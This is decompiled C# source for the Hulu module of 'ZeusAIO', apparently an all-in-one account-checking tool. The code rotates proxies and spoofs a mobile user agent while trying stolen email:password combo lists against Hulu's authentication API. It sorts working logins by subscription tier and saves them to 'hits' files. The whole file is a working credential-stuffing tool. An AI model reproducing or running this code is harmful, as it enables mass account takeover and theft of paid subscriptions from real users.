// Decompiled with JetBrains decompiler
// Type: Hulu.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Hulu
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "HolaVPN/2.12 (iPhone; iOS 12.4.7; Scale/2.00)";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              string str1 = "affiliate_name=apple&friendly_name=Andy%27s+Iphone&password=" + s[1] + "&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email=" + s[0];
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string source = httpRequest.Post("https://auth.hulu.com/v1/device/password/authenticate", str1, "application/x-www-form-urlencoded").ToString();
              bool flag = source.Contains("user_token");
              if (!source.Contains("Your login is invalid"))
              {
                if (flag)
                {
                  string str2 = Check.Parse(source, "user_token\":\"", "\",\"");
                  httpRequest.AddHeader("Authorization", "Bearer " + str2);
                  string str3 = httpRequest.Get("https://home.hulu.com/v1/users/self").ToString();
                  if (str3.Contains("262144"))
                  {
                    ++mainmenu.frees;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[FREE - HULU] " + s[0] + ":" + s[1], Color.OrangeRed);
                    Export.AsResult("/Hulu_frees", s[0] + ":" + s[1]);
                    return false;
                  }
                  if (str3.Contains("66536"))
                  {
                    ++mainmenu.hits;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[HIT - HULU] " + s[0] + ":" + s[1] + " | Hulu with ads", Color.Green);
                    Export.AsResult("/Hulu_hits", s[0] + ":" + s[1] + " | Hulu with ads");
                    return false;
                  }
                  if (str3.Contains("197608"))
                  {
                    ++mainmenu.hits;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[HIT - HULU] " + s[0] + ":" + s[1] + " | Hulu (No Ads)", Color.Green);
                    Export.AsResult("/Hulu_hits", s[0] + ":" + s[1] + " | Hulu (No Ads)");
                    return false;
                  }
                  if (str3.Contains("459752"))
                  {
                    ++mainmenu.hits;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[HIT - HULU] " + s[0] + ":" + s[1] + " | Hulu (No Ads) + Showtime", Color.Green);
                    Export.AsResult("/Hulu_hits", s[0] + ":" + s[1] + " | Hulu (No Ads) + Showtime");
                    return false;
                  }
                  if (str3.Contains("1311769576"))
                  {
                    ++mainmenu.hits;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[HIT - HULU] " + s[0] + ":" + s[1] + " |  Hulu (No Ads) + Live TV, Enhanced Cloud DVR + Unlimited Screens Bundle, STARZÂ®", Color.Green);
                    Export.AsResult("/Hulu_hits", s[0] + ":" + s[1] + " |  Hulu (No Ads) + Live TV, Enhanced Cloud DVR + Unlimited Screens Bundle, STARZÂ®");
                    return false;
                  }
                  if (str3.Contains("1049576"))
                  {
                    ++mainmenu.hits;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[HIT - HULU] " + s[0] + ":" + s[1] + " |  Hulu + Live TV + HBO + CINEMAX", Color.Green);
                    Export.AsResult("/Hulu_hits", s[0] + ":" + s[1] + " |  Hulu + Live TV + HBO + CINEMAX");
                    return false;
                  }
                  if (str3.Contains("200356"))
                  {
                    ++mainmenu.hits;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[HIT - HULU] " + s[0] + ":" + s[1] + " |  Hulu (No Ads) Free Trial", Color.Green);
                    Export.AsResult("/Hulu_hits", s[0] + ":" + s[1] + " |  Hulu (No Ads) Free Trial");
                    return false;
                  }
                  if (str3.Contains("70125"))
                  {
                    ++mainmenu.hits;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[HIT - HULU] " + s[0] + ":" + s[1] + " |  Hulu + CINEMAXÂ®", Color.Green);
                    Export.AsResult("/Hulu_hits", s[0] + ":" + s[1] + " |  Hulu + CINEMAXÂ®");
                    return false;
                  }
                  break;
                }
                break;
              }
              break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
